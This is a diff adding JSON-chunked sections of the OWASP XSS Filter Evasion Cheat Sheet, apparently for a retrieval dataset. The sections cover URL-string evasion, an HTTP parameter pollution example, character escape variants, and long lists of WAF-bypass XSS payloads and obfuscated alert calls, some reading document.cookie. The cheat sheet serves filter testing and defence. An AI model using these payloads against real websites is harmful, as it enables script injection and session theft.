+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "// translates to http://, which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like (ht|f)tp(s)?:// (thanks to Ozh for part of this one). You can also change the // to \\\\\\\\. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL:\n\n```\n<A HREF=\"//www.google.com/\">XSS</A>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#090",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > URL String Evasion > Removing CNAMEs",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "When combined with the above URL, removing www. will save an additional 4 bytes for a total byte savings of 9 for servers that have set this up properly:\n\n```\n<A HREF=\"http://google.com/\">XSS</A>\n```\n\nExtra dot for absolute DNS:\n\n```\n<A HREF=\"http://www.google.com./\">XSS</A>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#091",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > URL String Evasion > JavaScript Link Location",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<A HREF=\"javascript:document.location='http://www.google.com/'\">XSS</A>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#092",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > URL String Evasion > Content Replace as Attack Vector",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Assuming http://www.google.com/ is programmatically replaced with nothing. A similar attack vector has been used against several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector java&\\#x09;script: was converted into java script:, which renders in IE:\n\n```\n<A HREF=\"http://www.google.com/ogle.com/\">XSS</A>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#093",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Assisting XSS with HTTP Parameter Pollution",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "If a content sharing flow on a web site is implemented as shown below, this attack will work. There is a Content page which includes some content provided by users and this page also includes a link to Share page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the title parameter in the Content page to prevent against XSS but for some reasons they didn't URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since content_type's value is a constant and will always be integer, they didn't encode or validate the content_type in the Share page."
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#094",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Assisting XSS with HTTP Parameter Pollution > Content Page Source Code",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\na href=\"/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>\">Share</a>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#095",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Assisting XSS with HTTP Parameter Pollution > Share Page Source Code",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<script>\nvar contentType = <%=Request.getParameter(\"content_type\")%>;\nvar title = \"<%=Encode.forJavaScript(request.getParameter(\"title\"))%>\";\n...\n//some user agreement and sending to server logic might be here\n...\n</script>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#096",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Assisting XSS with HTTP Parameter Pollution > Content Page Output",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "If attacker set the untrusted content title as This is a regular title&content_type=1;alert(1) the link in Content page would be this:\n\n```\n<a href=\"/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)\">Share</a>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#097",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Assisting XSS with HTTP Parameter Pollution > Share Page Output",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "And in share page output could be this:\n\n```\n<script>\nvar contentType = 1; alert(1);\nvar title = \"This is a regular title\";\n…\n//some user agreement and sending to server logic might be here\n…\n</script>\n```\n\nAs a result, in this example the main flaw is trusting the content_type in the Share page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS."
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#098",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Character Escape Sequences",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Here are all the possible combinations of the character \\< in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above.\n\n<\n\n%3C\n\n&lt\n\n&lt;\n\n&LT\n\n&LT;\n\n&#60;\n\n&#060;\n\n&#0060;\n\n&#00060;\n\n&#000060;\n\n&#0000060;\n\n&#60;\n\n&#060;\n\n&#0060;\n\n&#00060;\n\n&#000060;\n\n&#0000060;\n\n&#x3c;\n\n&#x03c;\n\n&#x003c;\n\n&#x0003c;\n\n&#x00003c;\n\n&#x000003c;\n\n&#x3c;\n\n&#x03c;\n\n&#x003c;\n\n&#x0003c;\n\n&#x00003c;\n\n&#x000003c;\n\n&#X3c;\n\n&#X03c;\n\n&#X003c;\n\n&#X0003c;\n\n&#X00003c;\n\n&#X000003c;\n\n&#X3c;\n\n&#X03c;\n\n&#X003c;\n\n&#X0003c;\n\n&#X00003c;\n\n&#X000003c;\n\n&#x3C;\n\n&#x03C;\n\n&#x003C;\n\n&#x0003C;\n\n&#x00003C;\n\n&#x000003C;\n\n&#x3C;\n\n&#x03C;\n\n&#x003C;\n\n&#x0003C;\n\n&#x00003C;\n\n&#x000003C;\n\n&#X3C;\n\n&#X03C;\n\n&#X003C;\n\n&#X0003C;\n\n&#X00003C;\n\n&#X000003C;\n\n&#X3C;\n\n&#X03C;\n\n&#X003C;\n\n&#X0003C;\n\n&#X00003C;\n\n&#X000003C;\n\n\\x3c\n\n\\x3C\n\n\\u003c\n\n\\u003C"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#099",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Methods to Bypass WAF – Cross-Site Scripting > General issues > Stored XSS",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction."
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#100",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Methods to Bypass WAF – Cross-Site Scripting > General issues > Reflected XSS in JavaScript",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Example:\n\n```\n<script> ... setTimeout(\\\\\"writetitle()\\\\\",$\\_GET\\[xss\\]) ... </script>\n```\n\nExploitation:\n\n```\n/?xss=500); alert(document.cookie);//\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#101",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Methods to Bypass WAF – Cross-Site Scripting > General issues > DOM-based XSS",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Example:\n\n```\n<script> ... eval($\\_GET\\[xss\\]); ... </script>\n```\n\nExploitation:\n\n```\n/?xss=document.cookie\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#102",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Methods to Bypass WAF – Cross-Site Scripting > General issues > XSS via request Redirection",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Vulnerable code:\n\n```\n...\nheader('Location: '.$_GET['param']);\n...\n```\n\nAs well as:\n\n```\n...\nheader('Refresh: 0; URL='.$_GET['param']);\n...\n```\n\nThis request will not pass through the WAF:\n\n```\n/?param=<javascript:alert(document.cookie>)\n```\n\nThis request will pass through the WAF and an XSS attack will be conducted in certain browsers:\n\n```\n/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#103",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Methods to Bypass WAF – Cross-Site Scripting > WAF ByPass Strings for XSS",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "<Img src = x onerror = \"javascript: window.onerror = alert; throw XSS\">\n\n<Video> <source onerror = \"javascript: alert (XSS)\">\n\n<Input value = \"XSS\" type = text>\n\n<applet code=\"javascript:confirm(document.cookie);\">\n\n<isindex x=\"javascript:\" onmouseover=\"alert(XSS)\">\n\n\"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>\n\n\"><img src=\"x:x\" onerror=\"alert(XSS)\">\n\n\"><iframe src=\"javascript:alert(XSS)\">\n\n<object data=\"javascript:alert(XSS)\">\n\n<isindex type=image src=1 onerror=alert(XSS)>\n\n<img src=x:alert(alt) onerror=eval(src) alt=0>\n\n<img src=\"x:gif\" onerror=\"window['al\\u0065rt'](0)\"></img>\n\n<iframe/src=\"data:text/html,<svg onload=alert(1)>\">\n\n<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>\n\n```\n<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script\n```\n\n<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">\n\n<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>\n\n<form><a href=\"javascript:\\u0061lert(1)\">X\n\n</script><img/*%00/src=\"worksinchrome&colon;prompt(1)\"/%00*/onerror='eval(src)'>\n\n<style>//*{x:expression(alert(/xss/))}//<style></style>\n\nOn Mouse Over​:\n\n<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">\n\n<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe\n\n```\n<script x> alert(1) </script 1=2\n```\n\n<form><button formaction=javascript&colon;alert(1)>CLICKME\n\n<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"\n\n<iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>\n\n<OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT>"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#104",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Methods to Bypass WAF – Cross-Site Scripting > Filter Bypass Alert Obfuscation",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "(alert)(1)\n\na=alert,a(1)\n\n[1].find(alert)\n\ntop[“al”+”ert”](1)\n\ntop[/al/.source+/ert/.source](1)\n\nal\\u0065rt(1)\n\ntop[‘al\\145rt’](1)\n\ntop[‘al\\x65rt’](1)\n\ntop[8680439..toString(30)](1)\n\nalert?.()\n\n(alert())\n\nThe payload should include leading and trailing backticks:\n\n```\n&#96;`${alert``}`&#96;\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#105",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "References",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "MDN: Cross-Site Scripting (XSS)\n\nCWE-79: Improper Neutralization of Input During Web Page Generation"
+  }
+ ]
+}
